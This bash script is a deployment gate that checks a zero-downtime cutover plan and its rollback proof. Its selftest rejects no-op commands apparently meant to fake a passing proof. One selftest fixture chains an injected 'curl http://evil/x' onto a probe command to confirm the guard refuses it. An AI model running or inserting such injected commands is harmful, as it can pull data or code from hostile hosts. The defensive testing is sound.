#!/usr/bin/env bash
# WALTEUR zero-downtime-cutover-gate — prove a zero-downtime deploy/cutover strategy with a PROVEN
# rollback (complements migration-proof-gate, which proves the schema move; this proves the CUTOVER).
#
# HONESTY LABELS:
#   HARD     — exit-2 on checkable facts: strategy is in the allowed set; rollback_command present;
#              rollback_proof.exit_code==0 with a FRESH ran_ts; every migration reversible==true OR
#              carries a signed expand-contract justification ref; health_check present.
#   EXECUTE-PROBE (HARD when armed) — with WALTEUR_CUTOVER_EXEC=1, rollback_proof.command is RE-RUN
#              through the SAME allowlisted-runner + dangerous-token guard as authz-tenant-gate, the exit
#              is OBSERVED, and a trivial/constant command is REJECTED. Sets cutover_probe_executed=true.
#   PROTOCOL — when not armed, the rollback_proof is an LLM-authored attestation whose SHAPE + FRESHNESS
#              are checked, NOT its real-world correctness. A protocol PASS is never sold as observed.
#
# APPLICABILITY:
#   Applies when a deploy or schema cutover is DECLARED — walteur-kit/cutover-plan.json exists, OR
#   autopilot STATE.phase is ship/reflect, OR WALTEUR_CUTOVER_REQUIRED=1. Else NOT_APPLICABLE, exit 0.
#
# CONTRACT:
#   walteur-kit/PAUSED present                       => exit 2.
#   WALTEUR_CUTOVER=off                              => loud SKIP, exit 0.
#   jq absent (required to read the plan)            => loud SKIP (cannot_measure), exit 0 — never silent green.
#   cutover declared but cutover-plan.json absent    => FAIL, exit 2.
#   malformed / weak / stale / non-reversible plan   => FAIL, exit 2.
#   complete plan (+ probe observed when armed)      => PASS, exit 0.
#
# Required cutover-plan.json:
#   { strategy in {blue-green,canary,expand-contract,rolling},
#     rollback_command,
#     rollback_proof:{command, exit_code, ran_ts},
#     migrations:[{id, reversible(bool), down_command}],   # down_command required when reversible
#     health_check:{command, expect_exit},
#     traffic_shift_steps }                                 # array of >=1 step
#   A non-reversible migration MUST carry expand_contract_justification_ref (a signed waiver path).
#
# Report: walteur-kit/zero-downtime-cutover-report.json
# Bypass: WALTEUR_CUTOVER=off
# --help: self-documentation BEFORE any side effect (S033 usability contract)
case "${1:-}" in
  -h|--help)
  printf '%s\n' "zero-downtime-cutover-gate - prove a zero-downtime deploy/cutover strategy with a PROVEN"
  printf '%s\n' "usage: bash zero-downtime-cutover-gate.sh [--selftest|--help|<default run>]"
  printf '%s\n' "report: walteur-kit/zero-downtime-cutover-report.json - fix recipes: walteur-kit/REMEDIATION.md (## zero-downtime-cutover-gate)"
  printf '%s\n' "bypass: WALTEUR_CUTOVER=off (recorded, not free)"
  exit 0 ;;
esac

set -uo pipefail

# Resolve THIS script to an absolute path so we can source the shared probe-proof guard from our own
# hooks dir. Every sub-run invokes "bash $SELF" with a different WALTEUR_ROOT; a relative $0 would break
# if the gate were launched via a relative path, so anchor it once here.
case "$0" in /*|?:[\\/]*) SELF="$0" ;; *) SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")" ;; esac
# Fail-closed source of the shared constant-exit/no-op guard (probe_proves_something). It closes the
# constant-exit CLASS that per-gate regex enumeration cannot. If it sources, PROBE_GUARD=1; if the file
# is absent at runtime, PROBE_GUARD stays 0 and the EXEC path FAILS CLOSED (never silently skips).
PROBE_GUARD=0
if [ -f "${SELF%/*}/_probe-proof.sh" ]; then
  . "${SELF%/*}/_probe-proof.sh" && PROBE_GUARD=1
fi

input_dir="${1:-}"
if [ -n "${WALTEUR_ROOT:-}" ] && [ -d "$WALTEUR_ROOT" ]; then
  ROOT="$(cd "$WALTEUR_ROOT" && pwd)"
elif [ -n "$input_dir" ] && [ -d "$input_dir" ]; then
  ROOT="$(cd "$input_dir" && pwd)"
else
  ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
fi
ROOT="$(cd "$ROOT" && pwd)"
KIT="$ROOT/walteur-kit"
CONTRACT="$KIT/build-contract.json"
PLAN="$KIT/cutover-plan.json"
STATE="$KIT/autopilot/STATE.json"
REPORT="$KIT/zero-downtime-cutover-report.json"
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
MAX_AGE_DAYS="${WALTEUR_CUTOVER_MAX_AGE_DAYS:-14}"
mkdir -p "$KIT"

have() { command -v "$1" >/dev/null 2>&1; }

# EXEC default: build-class-aware (S033). When walteur-kit/build-contract.json exists and its build_class
# is a code class (software|data-ai|cloud-iac|mixed), WALTEUR_CUTOVER_EXEC defaults to ARMED (1) — a code
# build gets the genuine rollback-probe re-run by default. No contract, or a non-code class, keeps the
# legacy default of 0 (shape-read/attestation only). An explicit WALTEUR_CUTOVER_EXEC env value always
# wins over this default, so WALTEUR_CUTOVER_EXEC=0 still opts out even on a code-class contract.
default_cutover_exec_armed() {
  [ -f "$CONTRACT" ] || return 1
  have jq || return 1
  _cbc="$(jq -r '.build_class // ""' "$CONTRACT" 2>/dev/null)"
  case "$_cbc" in software|data-ai|cloud-iac|mixed) return 0;; *) return 1;; esac
}
if [ -z "${WALTEUR_CUTOVER_EXEC:-}" ] && default_cutover_exec_armed; then
  WALTEUR_CUTOVER_EXEC=1
fi

write_report() {
  local verdict="$1" reason="$2" extra="${3-}"
  # NOTE: a `${3:-{}}` default is a bash trap — it leaks a stray trailing `}` into the value, which
  # corrupts multi-key extras and silently drops markers. Default explicitly to the empty object instead.
  [ -n "$extra" ] || extra='{}'
  if have jq && printf '%s\n' "$extra" | jq -e . >/dev/null 2>&1; then
    jq -n --arg v "$verdict" --arg ts "$TS" --arg reason "$reason" --arg plan "${PLAN#"$ROOT"/}" --argjson extra "$extra" \
      '{verdict:$v, ts:$ts, gate:"zero-downtime-cutover-gate", plan_file:$plan, reason:$reason} + $extra' > "$REPORT" 2>/dev/null \
      && return 0
  fi
  printf '{"verdict":"%s","ts":"%s","gate":"zero-downtime-cutover-gate","plan_file":"%s","reason":"%s"}\n' \
    "$verdict" "$TS" "${PLAN#"$ROOT"/}" "$reason" > "$REPORT" 2>/dev/null || true
}

# Freshness: parse a ran_ts (ISO-8601 or YYYY-MM-DD) into epoch seconds; 0 on failure.
ts_to_epoch() {
  local v="$1" e=""
  e="$(date -u -d "$v" +%s 2>/dev/null)" || e=""
  if [ -z "$e" ]; then
    # BSD/macOS date fallbacks for the common shapes.
    e="$(date -u -j -f "%Y-%m-%dT%H:%M:%SZ" "$v" +%s 2>/dev/null)" || e=""
  fi
  if [ -z "$e" ]; then
    e="$(date -u -j -f "%Y-%m-%d %H:%M:%S" "$v 00:00:00" +%s 2>/dev/null)" || e=""
  fi
  printf '%s' "${e:-0}"
}

detect_required() {
  REQUIRED=0
  REQUIRED_REASON=""

  if [ "${WALTEUR_CUTOVER_REQUIRED:-}" = "1" ]; then
    REQUIRED=1; REQUIRED_REASON="WALTEUR_CUTOVER_REQUIRED=1"; return 0
  fi

  if [ -s "$PLAN" ]; then
    REQUIRED=1; REQUIRED_REASON="cutover-plan.json present (cutover declared)"; return 0
  fi

  if [ -s "$STATE" ] && have jq && jq empty "$STATE" >/dev/null 2>&1; then
    phase="$(jq -r '.phase // empty' "$STATE" 2>/dev/null || true)"
    case "$phase" in
      ship|reflect)
        REQUIRED=1; REQUIRED_REASON="STATE.phase=$phase"; return 0 ;;
    esac
  fi
}

selftest() {
  local pass=0 fail=0 tmp today
  # Resolve THIS script to an absolute path NOW — every sub-run invokes "bash $SELF" with a different
  # WALTEUR_ROOT, and a relative $0 would break if the gate were launched via a relative path.
  case "$0" in /*|?:[\\/]*) SELF="$0" ;; *) SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")" ;; esac
  today="$(date -u +%F)"

  ck() {
    local name="$1" want="$2" got="$3"
    if [ "$want" = "$got" ]; then
      echo "  ok   - $name (rc=$got)"
      pass=$((pass+1))
    else
      echo "  FAIL - $name (want $want got $got)"
      fail=$((fail+1))
    fi
  }

  if ! have jq; then
    echo "zero-downtime-cutover-gate selftest SKIP - jq not installed."
    return 0
  fi

  # Fresh ISO-8601 ran_ts for "now" so the freshness check passes in GOOD fixtures.
  fresh_ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }

  # GOOD plan: blue-green, rollback proven exit 0 fresh, one reversible migration with a down_command,
  # health_check present, traffic_shift_steps present. rollback_proof.command names a REAL on-disk script
  # (seeded below) so it passes BOTH the shared probe-proof guard (the token resolves to a real file) AND
  # re-executes offline to exit 0. `node --version` was a bare-interpreter no-op under the guard — it
  # proves no control — so it can no longer be the GOOD probe.
  write_good_plan() {
    local dst="$1" rts="${2:-$(fresh_ts)}"
    mkdir -p "$dst/walteur-kit"
    # Seed a real script the rollback probe points at, so the shared guard sees a token that resolves
    # on disk and the probe re-executes to exit 0 with no network/Node-version-specific runner behavior.
    printf 'process.exit(0)\n' > "$dst/walteur-kit/probe.cutover.mjs"
    cat > "$dst/walteur-kit/cutover-plan.json" <<JSON
{
  "schema_version": 1,
  "plan_id": "cutover-selftest",
  "strategy": "blue-green",
  "rollback_command": "kubectl rollout undo deployment/api",
  "rollback_proof": {
    "command": "node walteur-kit/probe.cutover.mjs",
    "exit_code": 0,
    "ran_ts": "$rts"
  },
  "migrations": [
    { "id": "0001_add_col", "reversible": true, "down_command": "ALTER TABLE accounts DROP COLUMN nickname" }
  ],
  "health_check": { "command": "curl -fsS http://127.0.0.1:8080/healthz", "expect_exit": 0 },
  "traffic_shift_steps": [
    { "step": 1, "percent": 10 },
    { "step": 2, "percent": 100 }
  ]
}
JSON
  }

  echo "zero-downtime-cutover-gate selftest:"

  # 1. no cutover declared and no plan -> NOT_APPLICABLE
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "no cutover declared, no plan -> NOT_APPLICABLE" 0 "$?"
  rm -rf "$tmp"

  # 2. cutover declared (REQUIRED=1) but plan absent -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  WALTEUR_CUTOVER_REQUIRED=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "cutover required without plan -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 3. invalid JSON plan -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  printf '{not json\n' > "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "invalid plan JSON -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 4. valid plan + rollback_proof exit 0 fresh -> PASS  (REQUIRED TWIN)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "valid plan + rollback_proof exit 0 -> PASS" 0 "$?"
  rm -rf "$tmp"

  # 5. missing rollback_command -> FAIL  (REQUIRED TWIN)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq 'del(.rollback_command)' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "missing rollback_command -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 6. rollback_proof.exit_code != 0 -> FAIL (rollback did not actually pass)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.exit_code = 1' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "rollback_proof exit_code != 0 -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 7. stale rollback_proof.ran_ts -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp" "2000-01-01T00:00:00Z"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "stale rollback_proof ran_ts -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 8. bad strategy not in the allowed set -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.strategy = "big-bang"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "strategy not in allowed set -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 9. non-reversible migration with NO justification ref -> FAIL  (REQUIRED TWIN)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.migrations[0].reversible = false | del(.migrations[0].down_command)' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "non-reversible migration, no justification -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 10. non-reversible migration WITH a signed expand-contract justification ref -> PASS
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  mkdir -p "$tmp/walteur-kit/cutover"
  printf 'expand-contract waiver: column kept nullable for two releases; signed dba-owner\n' > "$tmp/walteur-kit/cutover/justify-0001.txt"
  jq '.migrations[0].reversible = false | del(.migrations[0].down_command) | .migrations[0].expand_contract_justification_ref = "walteur-kit/cutover/justify-0001.txt"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "non-reversible migration WITH signed justification -> PASS" 0 "$?"
  rm -rf "$tmp"

  # 11. missing health_check -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq 'del(.health_check)' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "missing health_check -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 12. missing traffic_shift_steps -> FAIL
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq 'del(.traffic_shift_steps)' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "missing traffic_shift_steps -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 13. EXEC mode with a passing recorded command -> PASS with marker  (REQUIRED TWIN)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode + passing recorded command -> PASS" 0 "$?"
  jq -e '.cutover_probe_executed == true' "$tmp/walteur-kit/zero-downtime-cutover-report.json" >/dev/null 2>&1
  ck "EXEC mode report records probe execution marker" 0 "$?"
  rm -rf "$tmp"

  # 14. EXEC mode trivial command (bash -c 'exit 0') -> FAIL  (REQUIRED TWIN)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "bash -c '\''exit 0'\''"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode trivial command (bash -c 'exit 0') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 14b. CLASS CLOSURE — `bash -lc 'exit 0'` slipped past the old per-file regex (it only matched the
  # literal `bash -c 'exit 0'`). The shared probe-proof guard must now reject it. -> FAIL exit 2.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "bash -lc '\''exit 0'\''"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode class-evasion (bash -lc 'exit 0') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 14c. CLASS CLOSURE — trailing `;` evaded the literal regex too. -> FAIL exit 2.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "bash -c '\''exit 0;'\''"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode class-evasion (bash -c 'exit 0;') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 14d. CLASS CLOSURE — a node no-op body proves nothing either. -> FAIL exit 2.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "node -e '\''process.exit(0)'\''"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode class-evasion (node -e 'process.exit(0)') -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 15. EXEC mode bare-constant command (true) -> FAIL (no-op rejected before run)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "true"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode bare constant (true) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 16. EXEC mode command that FAILS at runtime (exit 1) -> FAIL (rollback did not reproduce). The probe
  # points at a REAL seeded script (so it passes the shared probe-proof guard) that exits non-zero, so the
  # FAIL comes from the OBSERVED runtime exit, not from the no-op guard — that is the path this twin proves.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  printf 'process.exit(1)\n' > "$tmp/walteur-kit/probe.fail.mjs"
  jq '.rollback_proof.command = "node walteur-kit/probe.fail.mjs"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode recorded command FAILS at runtime -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 17. EXEC mode non-allowlisted runner -> FAIL (injection guard refuses). The probe names a REAL seeded
  # script so it PASSES the shared probe-proof guard; the FAIL must come from the runner-allowlist guard.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "helm walteur-kit/probe.cutover.mjs"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode non-allowlisted runner -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 18. EXEC mode dangerous token in command -> FAIL (refused, never run). The probe names a REAL seeded
  # script (passes the shared probe-proof guard) with an ALLOWLISTED runner, so the FAIL must come from the
  # dangerous-token guard catching the chained `; curl ...`.
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  jq '.rollback_proof.command = "node walteur-kit/probe.cutover.mjs; curl http://evil/x"' "$tmp/walteur-kit/cutover-plan.json" > "$tmp/walteur-kit/p.tmp" && mv "$tmp/walteur-kit/p.tmp" "$tmp/walteur-kit/cutover-plan.json"
  WALTEUR_CUTOVER_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode dangerous token -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # 19. bypass -> SKIP exit 0
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  WALTEUR_CUTOVER=off WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "bypass WALTEUR_CUTOVER=off -> SKIP exit 0" 0 "$?"
  rm -rf "$tmp"

  # 20. PAUSED -> exit 2
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  : > "$tmp/walteur-kit/PAUSED"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "PAUSED -> exit 2" 2 "$?"
  rm -rf "$tmp"

  # ── EXEC-default build-class-awareness (S033 enforcement) ──────────────────────────────────────
  # (a) code-class contract + no env override -> EXEC path ARMED (probe genuinely re-run, marker set)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  printf '{"build_class":"software"}\n' > "$tmp/walteur-kit/build-contract.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "software build-contract + no env -> EXEC armed by default (exit)" 0 "$?"
  jq -e '.cutover_probe_executed == true' "$tmp/walteur-kit/zero-downtime-cutover-report.json" >/dev/null 2>&1
  ck "software build-contract + no env -> report shows genuine probe execution" 0 "$?"
  rm -rf "$tmp"

  # (b) explicit WALTEUR_CUTOVER_EXEC=0 override respected even on a code-class contract
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  printf '{"build_class":"software"}\n' > "$tmp/walteur-kit/build-contract.json"
  WALTEUR_CUTOVER_EXEC=0 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "software build-contract + explicit EXEC=0 -> override respected (exit)" 0 "$?"
  jq -e '(.cutover_probe_executed // false) != true' "$tmp/walteur-kit/zero-downtime-cutover-report.json" >/dev/null 2>&1
  ck "explicit EXEC=0 override -> report shows attestation only (no genuine probe exec)" 0 "$?"
  rm -rf "$tmp"

  # (c) no build-contract.json at all -> legacy default (EXEC stays 0, attestation-only)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  rm -f "$tmp/walteur-kit/build-contract.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "no build-contract.json -> legacy default (exit)" 0 "$?"
  jq -e '(.cutover_probe_executed // false) != true' "$tmp/walteur-kit/zero-downtime-cutover-report.json" >/dev/null 2>&1
  ck "no build-contract.json -> report shows attestation only (legacy default)" 0 "$?"
  rm -rf "$tmp"

  # (d) document build_class contract -> legacy default (EXEC stays 0) even though contract exists
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/cutover-selftest.XXXXXX")" || return 1
  write_good_plan "$tmp"
  printf '{"build_class":"document"}\n' > "$tmp/walteur-kit/build-contract.json"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "document build_class -> legacy default (exit)" 0 "$?"
  jq -e '(.cutover_probe_executed // false) != true' "$tmp/walteur-kit/zero-downtime-cutover-report.json" >/dev/null 2>&1
  ck "document build_class -> report shows attestation only (unaffected by EXEC-default change)" 0 "$?"
  rm -rf "$tmp"

  if [ "$fail" -eq 0 ]; then
    echo "zero-downtime-cutover-gate selftest: $pass/$pass passed"
    return 0
  fi
  echo "zero-downtime-cutover-gate selftest: $fail failed, $pass passed"
  return 1
}

if [ "${1:-}" = "--selftest" ]; then
  selftest
  exit $?
fi

if [ "${WALTEUR_CUTOVER:-}" = "off" ]; then
  write_report "SKIP" "WALTEUR_CUTOVER=off"
  echo "zero-downtime-cutover-gate: SKIP - bypassed via WALTEUR_CUTOVER=off -> $REPORT" >&2
  exit 0
fi

if [ -f "$KIT/PAUSED" ]; then
  write_report "FAIL" "WALTEUR is paused"
  echo "zero-downtime-cutover-gate: FAIL - walteur-kit/PAUSED present -> $REPORT" >&2
  exit 2
fi

detect_required

if [ ! -s "$PLAN" ]; then
  if [ "$REQUIRED" -eq 1 ]; then
    write_report "FAIL" "cutover declared but cutover-plan.json absent: $REQUIRED_REASON"
    echo "zero-downtime-cutover-gate: FAIL - cutover declared ($REQUIRED_REASON) but cutover-plan.json absent -> $REPORT" >&2
    exit 2
  fi
  write_report "NOT_APPLICABLE" "no cutover/deploy declared and cutover-plan.json absent"
  echo "zero-downtime-cutover-gate: NOT_APPLICABLE - no deploy/cutover declared -> $REPORT" >&2
  exit 0
fi

# jq is REQUIRED to read the plan. Absent => loud SKIP (cannot_measure), never silent green.
if ! have jq; then
  write_report "SKIP" "jq not installed (cannot_measure cutover plan)"
  echo "zero-downtime-cutover-gate: SKIP - jq not installed; cannot validate cutover-plan.json (recorded, not silent-green) -> $REPORT" >&2
  exit 0
fi

if ! jq empty "$PLAN" >/dev/null 2>&1; then
  write_report "FAIL" "cutover-plan.json is not valid JSON"
  echo "zero-downtime-cutover-gate: FAIL - cutover-plan.json is not valid JSON -> $REPORT" >&2
  exit 2
fi

# ── HARD shape checks ────────────────────────────────────────────────────────────────────────────
# strategy in allowed set · rollback_command present · rollback_proof complete · migrations well-formed
# · health_check present (command + expect_exit) · traffic_shift_steps a non-empty array.
if ! jq -e '
  type == "object"
  and (.strategy as $s | ["blue-green","canary","expand-contract","rolling"] | index($s))
  and (.rollback_command | type == "string" and length > 0)
  and (.rollback_proof | type == "object")
  and (.rollback_proof.command | type == "string" and length > 0)
  and (.rollback_proof.exit_code | type == "number")
  and (.rollback_proof.ran_ts | type == "string" and length > 0)
  and (.migrations | type == "array")
  and (.health_check | type == "object")
  and (.health_check.command | type == "string" and length > 0)
  and (.health_check.expect_exit | type == "number")
  and (.traffic_shift_steps | type == "array" and length >= 1)
' "$PLAN" >/dev/null; then
  write_report "FAIL" "cutover-plan.json missing required fields (strategy/rollback_command/rollback_proof/health_check/traffic_shift_steps)"
  echo "zero-downtime-cutover-gate: FAIL - cutover-plan.json missing required fields -> $REPORT" >&2
  exit 2
fi

# HARD: rollback_proof must record a PASSING run (exit_code == 0).
rb_exit="$(jq -r '.rollback_proof.exit_code' "$PLAN")"
if [ "$rb_exit" != "0" ]; then
  details="$(jq -n --argjson got "$rb_exit" '{rollback_proof_exit_code:$got}')"
  write_report "FAIL" "rollback_proof.exit_code must be 0 (rollback was not proven to pass)" "$details"
  echo "zero-downtime-cutover-gate: FAIL - rollback_proof.exit_code=$rb_exit (not 0) -> $REPORT" >&2
  exit 2
fi

# HARD: rollback_proof.ran_ts must be fresh (not in the future, within MAX_AGE_DAYS).
ran_ts="$(jq -r '.rollback_proof.ran_ts' "$PLAN")"
ran_epoch="$(ts_to_epoch "$ran_ts")"
now_epoch="$(date -u +%s)"
max_age_seconds=$((MAX_AGE_DAYS * 86400))
if [ "$ran_epoch" -le 0 ]; then
  write_report "FAIL" "rollback_proof.ran_ts is not parseable: $ran_ts"
  echo "zero-downtime-cutover-gate: FAIL - rollback_proof.ran_ts not parseable ($ran_ts) -> $REPORT" >&2
  exit 2
fi
if [ "$ran_epoch" -gt "$((now_epoch + 86400))" ]; then
  write_report "FAIL" "rollback_proof.ran_ts is in the future: $ran_ts"
  echo "zero-downtime-cutover-gate: FAIL - rollback_proof.ran_ts in the future ($ran_ts) -> $REPORT" >&2
  exit 2
fi
if [ $((now_epoch - ran_epoch)) -gt "$max_age_seconds" ]; then
  details="$(jq -n --arg rts "$ran_ts" --argjson max_age_days "$MAX_AGE_DAYS" '{rollback_proof_ran_ts:$rts, max_age_days:$max_age_days}')"
  write_report "FAIL" "rollback_proof is stale (older than ${MAX_AGE_DAYS}d)" "$details"
